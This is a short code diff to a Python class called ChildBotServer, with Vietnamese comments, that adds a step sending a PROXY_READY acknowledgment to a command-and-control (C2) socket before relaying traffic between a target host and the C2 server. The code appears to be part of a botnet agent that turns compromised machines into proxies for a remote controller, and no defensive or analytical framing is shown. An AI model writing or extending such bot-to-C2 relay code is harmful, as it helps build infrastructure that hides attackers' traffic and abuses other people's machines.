@@ -198,6 +198,11 @@ class ChildBotServer:
                 # Tạo connection đến target
                 self.create_proxy_connection(connection_id, target_host, target_port, is_https, False)
                 
+                # Gửi acknowledgment về C2
+                ack_command = f"PROXY_READY:{connection_id}\n"
+                self.c2_socket.send(ack_command.encode())
+                print(f"📤 Sent PROXY_READY acknowledgment for {connection_id}")
+                
                 # Bắt đầu luồng target->C2
                 threading.Thread(target=self.pump_target_to_c2, args=(connection_id,), daemon=True).start()
                 
